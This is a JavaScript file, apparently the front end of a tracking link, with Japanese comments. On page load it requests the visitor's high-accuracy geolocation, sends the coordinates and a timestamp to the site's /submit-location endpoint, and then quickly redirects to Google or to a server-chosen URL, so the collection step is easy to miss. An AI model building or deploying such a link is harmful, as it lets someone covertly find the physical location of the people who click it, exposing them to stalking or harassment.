// static/js/tracker.js
document.addEventListener('DOMContentLoaded', function() {
    // ページが読み込まれたら位置情報の取得を開始
    getLocationAndRedirect();
});

function getLocationAndRedirect() {
    const statusElement = document.getElementById('status');
    
    // ブラウザが位置情報APIをサポートしているか確認
    if (!navigator.geolocation) {
        statusElement.textContent = 'お使いのブラウザは位置情報サービスをサポートしていません。5秒後にGoogleに移動します...';
        // サポートしていない場合でも5秒後にGoogleにリダイレクト
        setTimeout(function() {
            window.location.href = 'https://www.google.co.jp/';
        }, 5000);
        return;
    }
    
    // 位置情報の取得を試みる
    navigator.geolocation.getCurrentPosition(
        // 成功時のコールバック
        function(position) {
            statusElement.textContent = '位置情報を取得しました。移動します...';
            
            // 位置情報データの作成
            var locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                timestamp: new Date().toISOString()
            };
            
            // データをサーバーに送信
            fetch('/submit-location', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(locationData)
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    // 指定されたURLにリダイレクト
                    window.location.href = data.redirect || 'https://www.google.co.jp/';
                } else {
                    statusElement.textContent = 'エラーが発生しました。5秒後にGoogleに移動します...';
                    setTimeout(function() {
                        window.location.href = 'https://www.google.co.jp/';
                    }, 5000);
                }
            })
            .catch(error => {
                console.error('Error:', error);
                statusElement.textContent = 'エラーが発生しました。5秒後にGoogleに移動します...';
                setTimeout(function() {
                    window.location.href = 'https://www.google.co.jp/';
                }, 5000);
            });
        },
        // エラー時のコールバック
        function(error) {
            let errorMessage;
            
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    errorMessage = '位置情報へのアクセスが拒否されました。';
                    break;
                case error.POSITION_UNAVAILABLE:
                    errorMessage = '位置情報を取得できませんでした。';
                    break;
                case error.TIMEOUT:
                    errorMessage = '位置情報の取得がタイムアウトしました。';
                    break;
                case error.UNKNOWN_ERROR:
                default:
                    errorMessage = '不明なエラーが発生しました。';
                    break;
            }
            
            statusElement.textContent = errorMessage + ' 5秒後にGoogleに移動します...';
            
            // エラーが発生しても5秒後にGoogleにリダイレクト
            setTimeout(function() {
                window.location.href = 'https://www.google.co.jp/';
            }, 5000);
        },
        // オプション
        {
            enableHighAccuracy: true,  // 高精度の位置情報を要求
            timeout: 10000,            // 10秒でタイムアウト
            maximumAge: 0              // キャッシュされた位置情報は使用しない
        }
    );
}